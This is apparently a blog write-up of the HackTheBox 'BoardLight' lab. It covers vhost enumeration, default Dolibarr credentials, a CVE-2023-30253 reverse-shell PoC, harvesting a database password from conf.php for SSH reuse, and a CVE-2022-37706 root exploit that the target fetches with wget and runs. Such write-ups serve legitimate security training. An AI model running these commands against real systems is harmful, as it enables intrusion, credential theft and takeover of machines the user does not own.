---
title: "HTB: BoardLight"
date: 2026-04-11
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - easy
  - vhost-enumeration
  - dolibarr
  - cve-2023-30253
  - credential-reuse
  - suid-exploit
  - cve-2022-37706
description: "BoardLight is an Easy Linux box where vhost discovery leads to a Dolibarr CRM running default creds, exploited via CVE-2023-30253 for a www-data shell, then a database password reused for SSH access as larissa, and finally an SUID enlightenment binary (CVE-2022-37706) to root."
summary: "BoardLight is an Easy Linux box where vhost discovery leads to a Dolibarr CRM running default creds, exploited via CVE-2023-30253 for a www-data shell, then a database password reused for SSH access as larissa, and finally an SUID enlightenment binary (CVE-2022-37706) to root."
cover:
  image: "/images/htb-boardlight/info-card.png"
  alt: "HTB BoardLight"
  relative: false
showToc: true
TocOpen: false
---

![HTB BoardLight info card](/images/htb-boardlight/info-card.png)

| Field      | Info     |
| ---------- | -------- |
| OS         | Linux    |
| Difficulty | Easy     |
| Release    | 2024     |

### Kill Chain

| Step | Action | Result |
| ---- | ------ | ------ |
| 1 | Nmap scan | Ports 22 (SSH) and 80 (HTTP) open |
| 2 | Vhost fuzzing on board.htb | Discovered crm.board.htb |
| 3 | Default creds (admin:admin) on Dolibarr 17.0.0 | Authenticated to CRM |
| 4 | CVE-2023-30253 PHP code injection | Shell as www-data |
| 5 | Read conf.php database credentials | Password: serverfun2$2023!! |
| 6 | SSH with password reuse | Shell as larissa, user flag |
| 7 | SUID enumeration finds enlightenment 0.23.1 | CVE-2022-37706 LPE |
| 8 | Run enlightenment exploit | Shell as root, root flag |

### Credentials

| User | Password | Source |
| ---- | -------- | ------ |
| admin | admin | Dolibarr default |
| dolibarrowner | serverfun2$2023!! | /var/www/html/crm.board.htb/htdocs/conf/conf.php |
| larissa | serverfun2$2023!! | Password reuse from DB config |

---

## Recon

### nmap

Quick sweep first to find open ports:

```console
$ nmap -p- --min-rate 8000 10.129.17.111

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Just two ports. A targeted service scan on both:

```console
$ nmap -p 22,80 -sC -sV 10.129.17.111

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8)
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ubuntu with Apache 2.4.41. Nothing exotic on SSH. Port 80 is where to start.

### HTTP - TCP 80

Browsing to the IP redirects to `board.htb`, so I added that to `/etc/hosts`. The site is a generic company template, the kind of thing you see on every box. Footer says "BoardLight" and it's all static content.

![BoardLight main website at board.htb](/images/htb-boardlight/board-htb-homepage.png)

Not much to interact with on the main site, so I fuzzed for virtual hosts. The `-fs 15949` flag filters out responses matching the size of the default page:

```console
$ ffuf -u http://board.htb/ -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 15949

crm   [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 108ms]
```

`crm.board.htb` hit. Added it to `/etc/hosts` and opened it up.

### Dolibarr CRM - TCP 80

The vhost serves Dolibarr 17.0.0, an open-source ERP/CRM platform. The version number is right there on the login page.

![Dolibarr 17.0.0 login page](/images/htb-boardlight/dolibarr-login.png)

Before hunting for exploits, I always try the obvious: default credentials. `admin:admin` went right in.

---

## Shell as www-data

### CVE-2023-30253

Dolibarr 17.0.0 is vulnerable to CVE-2023-30253, a PHP code injection flaw that lets an authenticated user execute arbitrary PHP through crafted website content. Since we're already authenticated as admin, this is a straightforward path to RCE.

I used the PoC from [Rubikcuv5](https://github.com/Rubikcuv5/cve-2023-30253):

**Kali:**
```console
$ git clone https://github.com/Rubikcuv5/cve-2023-30253.git
$ cd cve-2023-30253
$ python3 -m venv venv && source venv/bin/activate
$ pip3 install -r requirements.txt
```

Set up a listener, then fire the exploit targeting the CRM with our credentials and my Kali IP:

**Kali:**
```console
$ nc -lvnp 9001
```

**Kali:**
```console
$ python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -r 10.10.15.229 9001
```

The callback landed immediately. I upgraded the shell inside the reverse shell to get something usable:

**Target (www-data):**
```console
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
$ stty raw -echo; fg
$ export TERM=xterm
```

![Shell as www-data confirming code execution](/images/htb-boardlight/www-data-shell.png)

---

## Shell as larissa

### Digging through the web root

Running as `www-data` under the web root means I have read access to the application config files. Dolibarr stores its database credentials in `conf/conf.php`:

**Target (www-data):**
```console
$ cat /var/www/html/crm.board.htb/htdocs/conf/conf.php

$dolibarr_main_db_host='localhost';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
...[snip]...
```

There's a real password there: `serverfun2$2023!!`. Before digging into the database, I checked `/etc/passwd` for local users:

**Target (www-data):**
```console
$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

One user: `larissa`. People reuse passwords between app configs and their system account constantly on HTB, and this box is no different.

**Kali:**
```console
$ ssh larissa@board.htb
```

Password `serverfun2$2023!!` worked.

![SSH session as larissa](/images/htb-boardlight/larissa-shell.png)

### user.txt

**Target (larissa):**
```console
$ cat user.txt
c2bf4c9d************************
```

![user.txt flag captured](/images/htb-boardlight/user-flag.png)

---

## Shell as root

### SUID enumeration

Standard first step from a user shell: look for SUID binaries. Something non-standard usually stands out:

**Target (larissa):**
```console
$ find / -perm -4000 -type f 2>/dev/null

...[snip]...
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
...[snip]...
```

Enlightenment utils with the SUID bit. That's unusual. I checked the version:

**Target (larissa):**
```console
$ enlightenment --version

Version: 0.23.1
```

### CVE-2022-37706

Enlightenment 0.23.1 is vulnerable to CVE-2022-37706, a local privilege escalation bug in the `enlightenment_sys` SUID binary. The exploit abuses a path traversal in how the binary handles mount commands, allowing an unprivileged user to execute arbitrary commands as root. There's a clean PoC from [MaherAzzouzi](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit).

I grabbed it on my Kali box and served it over HTTP:

**Kali:**
```console
$ git clone https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
$ cd CVE-2022-37706-LPE-exploit
$ python3 -m http.server
```

On the target, I pulled the script down and ran it:

**Target (larissa):**
```console
$ wget http://10.10.15.229:8000/exploit.sh
$ chmod +x exploit.sh
$ ./exploit.sh
```

![Root shell after running the enlightenment exploit](/images/htb-boardlight/root-whoami.png)

### root.txt

**Target (root):**
```console
# cat root.txt
a830c7e7************************
```

![root.txt flag captured](/images/htb-boardlight/root-flag.png)
